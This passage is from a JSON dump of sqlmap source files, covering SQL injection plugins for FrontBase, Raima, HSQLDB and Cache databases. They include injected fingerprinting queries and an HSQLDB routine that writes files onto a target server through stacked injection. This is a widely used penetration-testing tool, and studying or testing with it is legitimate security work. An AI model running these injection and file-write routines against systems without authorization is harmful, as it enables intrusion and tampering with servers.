Enumeration\nfrom plugins.dbms.frontbase.filesystem import Filesystem\nfrom plugins.dbms.frontbase.fingerprint import Fingerprint\nfrom plugins.dbms.frontbase.syntax import Syntax\nfrom plugins.dbms.frontbase.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass FrontBaseMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines FrontBase methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = FRONTBASE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.FRONTBASE] = Syntax.escape\n", "plugins/dbms/raima/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Raima Database Manager it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getCurrentUser(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        warnMsg = \"on Raima Database Manager it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on Raima Database Manager it is not possible to test if current user is DBA\"\n        logger.warning(warnMsg)\n\n    def getUsers(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchDb(self):\n        warnMsg = \"on Raima Database Manager it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Raima Database Manager it is not possible to search tables\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Raima Database Manager it is not possible to search columns\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Raima Database Manager search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Raima Database Manager it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/raima/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Raima Database Manager it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/raima/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/raima/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import RAIMA_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.RAIMA)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.RAIMA\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(RAIMA_ALIASES):\n            setDbms(DBMS.RAIMA)\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.RAIMA\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"ROWNUMBER()=ROWNUMBER()\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.RAIMA\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"INSSTR('[RANDSTR1]',0,0,'[RANDSTR2]') IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.RAIMA\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.RAIMA)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.RAIMA\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = (\"%s%s\" % (DBMS.RAIMA, METADB_SUFFIX)).replace(' ', '_')\n", "plugins/dbms/raima/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Raima Database Manager it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Raima Database Manager it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Raima Database Manager it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Raima Database Manager it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/raima/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Raima Database Manager it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Raima Database Manager it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/raima/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import RAIMA_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.raima.enumeration import Enumeration\nfrom plugins.dbms.raima.filesystem import Filesystem\nfrom plugins.dbms.raima.fingerprint import Fingerprint\nfrom plugins.dbms.raima.syntax import Syntax\nfrom plugins.dbms.raima.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass RaimaMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Raima methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = RAIMA_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.RAIMA] = Syntax.escape\n", "plugins/dbms/hsqldb/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import HSQLDB_DEFAULT_SCHEMA\nfrom lib.request import inject\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        if not conf.getBanner:\n            return\n\n        if kb.data.banner is None:\n            infoMsg = \"fetching banner\"\n            logger.info(infoMsg)\n\n            query = queries[DBMS.HSQLDB].banner.query\n            kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=True))\n\n        return kb.data.banner\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on HSQLDB it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on HSQLDB it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        return HSQLDB_DEFAULT_SCHEMA\n\n    def getStatements(self):\n        warnMsg = \"on HSQLDB it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/hsqldb/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import jaydebeapi\n    import jpype\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import checkFile\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import readInput\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/\n    User guide: https://pypi.python.org/pypi/JayDeBeApi/#usage & http://jpype.sourceforge.net/doc/user-guide/userguide.html\n    API: -\n    Debian package: -\n    License: LGPL & Apache License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n        try:\n            msg = \"please enter the location of 'hsqldb.jar'? \"\n            jar = readInput(msg)\n            checkFile(jar)\n            args = \"-Djava.class.path=%s\" % jar\n            jvm_path = jpype.getDefaultJVMPath()\n            jpype.startJVM(jvm_path, args)\n        except Exception as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        try:\n            driver = 'org.hsqldb.jdbc.JDBCDriver'\n            connection_string = 'jdbc:hsqldb:mem:.'  # 'jdbc:hsqldb:hsql://%s/%s' % (self.hostname, self.db)\n            self.connector = jaydebeapi.connect(driver, connection_string, str(self.user), str(self.password))\n        except Exception as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except Exception as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except Exception as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        upper_query = query.upper()\n\n        if query and not (upper_query.startswith(\"SELECT \") or upper_query.startswith(\"VALUES \")):\n            query = \"VALUES %s\" % query\n\n        if query and upper_query.startswith(\"SELECT \") and \" FROM \" not in upper_query:\n            query = \"%s FROM (VALUES(0))\" % query\n\n        self.cursor.execute(query)\n        retVal = self.cursor.fetchall()\n\n        return retVal\n", "plugins/dbms/hsqldb/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/hsqldb/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import HSQLDB_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.HSQLDB)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp and not conf.api:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp and not conf.api:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n        actVer = Format.getDbms()\n\n        if not conf.extensiveFp:\n            value += actVer\n            return value\n\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                if re.search(r\"-log$\", kb.data.banner or \"\"):\n                    banVer += \", logging enabled\"\n\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        \"\"\"\n        References for fingerprint:\n        DATABASE_VERSION()\n        version 2.2.6 added two-arg REPLACE functio REPLACE('a','a') compared to REPLACE('a','a','d')\n        version 2.2.5 added SYSTIMESTAMP function\n        version 2.2.3 added REGEXPR_SUBSTRING and REGEXPR_SUBSTRING_ARRAY functions\n        version 2.2.0 added support for ROWNUM() function\n        version 2.1.0 added MEDIAN aggregate function\n        version < 2.0.1 added support for datetime ROUND and TRUNC functions\n        version 2.0.0 added VALUES support\n        version 1.8.0.4 Added org.hsqldbdb.Library function, getDatabaseFullProductVersion to return the\n                        full version string, including the 4th digit (e.g 1.8.0.4).\n        version 1.7.2 CASE statements added and INFORMATION_SCHEMA\n\n        \"\"\"\n\n        if not conf.extensiveFp and Backend.isDbmsWithin(HSQLDB_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.HSQLDB, Backend.getVersion()))\n\n            if Backend.isVersionGreaterOrEqualThan(\"1.7.2\"):\n                kb.data.has_information_schema = True\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.HSQLDB\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"CASEWHEN(1=1,1,0)=1\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.HSQLDB\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"ROUNDMAGIC(PI())>=3\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.HSQLDB\n                logger.warning(warnMsg)\n\n                return False\n            else:\n                result = inject.checkBooleanExpression(\"ZERO() IS 0\")   # Note: check for H2 DBMS (sharing majority of same functions)\n                if result:\n                    warnMsg = \"the back-end DBMS is not %s\" % DBMS.HSQLDB\n                    logger.warning(warnMsg)\n\n                    return False\n\n                kb.data.has_information_schema = True\n                Backend.setVersion(\">= 1.7.2\")\n                setDbms(\"%s 1.7.2\" % DBMS.HSQLDB)\n\n                banner = self.getBanner()\n                if banner:\n                    Backend.setVersion(\"= %s\" % banner)\n                else:\n                    if inject.checkBooleanExpression(\"(SELECT [RANDNUM] FROM (VALUES(0)))=[RANDNUM]\"):\n                        Backend.setVersionList([\">= 2.0.0\", \"< 2.3.0\"])\n                    else:\n                        banner = unArrayizeValue(inject.getValue(\"\\\"org.hsqldbdb.Library.getDatabaseFullProductVersion\\\"()\", safeCharEncode=True))\n                        if banner:\n                            Backend.setVersion(\"= %s\" % banner)\n                        else:\n                            Backend.setVersionList([\">= 1.7.2\", \"< 1.8.0\"])\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.HSQLDB\n            logger.warning(warnMsg)\n\n            dbgMsg = \"...or version is < 1.7.2\"\n            logger.debug(dbgMsg)\n\n            return False\n\n    def getHostname(self):\n        warnMsg = \"on HSQLDB it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def checkDbmsOs(self, detailed=False):\n        if Backend.getOs():\n            infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n            logger.info(infoMsg)\n        else:\n            self.userChooseDbmsOs()\n", "plugins/dbms/hsqldb/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on HSQLDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on HSQLDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on HSQLDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on HSQLDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/hsqldb/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import randomStr\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import PLACE\nfrom lib.request import inject\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on HSQLDB it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    @stackedmethod\n    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        func_name = randomStr()\n        max_bytes = 1024 * 1024\n\n        debugMsg = \"creating JLP procedure '%s'\" % func_name\n        logger.debug(debugMsg)\n\n        addFuncQuery = \"CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) \" % (func_name, max_bytes)\n        addFuncQuery += \"LANGUAGE JAVA DETERMINISTIC NO SQL \"\n        addFuncQuery += \"EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'\"\n        inject.goStacked(addFuncQuery)\n\n        fcEncodedList = self.fileEncode(localFile, \"hex\", True)\n        fcEncodedStr = fcEncodedList[0][2:]\n        fcEncodedStrLen = len(fcEncodedStr)\n\n        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:\n            warnMsg = \"as the injection is on a GET parameter and the file \"\n            warnMsg += \"to be written hexadecimal value is %d \" % fcEncodedStrLen\n            warnMsg += \"bytes, this might cause errors in the file \"\n            warnMsg += \"writing process\"\n            logger.warning(warnMsg)\n\n        debugMsg = \"exporting the %s file content to file '%s'\" % (fileType, remoteFile)\n        logger.debug(debugMsg)\n\n        # Reference: http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures\n        invokeQuery = \"CALL %s('%s', CAST('%s' AS VARBINARY(%s)))\" % (func_name, remoteFile, fcEncodedStr, max_bytes)\n        inject.goStacked(invokeQuery)\n\n        logger.debug(\"cleaning up the database management system\")\n\n        delQuery = \"DELETE PROCEDURE %s\" % func_name\n        inject.goStacked(delQuery)\n\n        message = \"the local file '%s' has been written on the back-end DBMS\" % localFile\n        message += \"file system ('%s')\" % remoteFile\n        logger.info(message)\n", "plugins/dbms/hsqldb/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import HSQLDB_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.hsqldb.enumeration import Enumeration\nfrom plugins.dbms.hsqldb.filesystem import Filesystem\nfrom plugins.dbms.hsqldb.fingerprint import Fingerprint\nfrom plugins.dbms.hsqldb.syntax import Syntax\nfrom plugins.dbms.hsqldb.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass HSQLDBMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines HSQLDB methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = HSQLDB_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.HSQLDB] = Syntax.escape\n", "plugins/dbms/cache/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom lib.core.settings import CACHE_DEFAULT_SCHEMA\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getCurrentDb(self):\n        return CACHE_DEFAULT_SCHEMA\n\n    def getUsers(self):\n        warnMsg = \"on Cache it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Cache it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Cache it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on Cache it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Cache it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on Cache it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/cache/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import jaydebeapi\n    import jpype\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import checkFile\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import readInput\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/\n    User guide: https://pypi.python.org/pypi/JayDeBeApi/#usage & http://jpype.sourceforge.net/doc/user-guide/userguide.html\n    API: -\n    Debian package: -\n    License: LGPL & Apache License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n        try:\n            msg = \"please enter the location of 'cachejdbc.jar'? \"\n            jar = readInput(msg)\n            checkFile(jar)\n            args = \"-Djava.class.path=%s\" % jar\n            jvm_path = jpype.getDefaultJVMPath()\n            jpype.startJVM(jvm_path, args)\n        except Exception as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        try:\n            driver = 'com.intersys.jdbc.CacheDriver'\n            connection_string = 'jdbc:Cache://%s:%d/%s' % (self.hostname, self.port, self.db)\n            self.connector = jaydebeapi.connect(driver, connection_string, str(self.user), str(self.password))\n        except Exception as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except Exception as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except Exception as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/cache/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/cache/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import CACHE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CACHE)\n\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n\n        if fork is None:\n            if inject.checkBooleanExpression(\"$ZVERSION LIKE '%IRIS%'\"):\n                fork = FORK.IRIS\n            else:\n                fork = \"\"\n\n            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)\n\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.CACHE\n            if 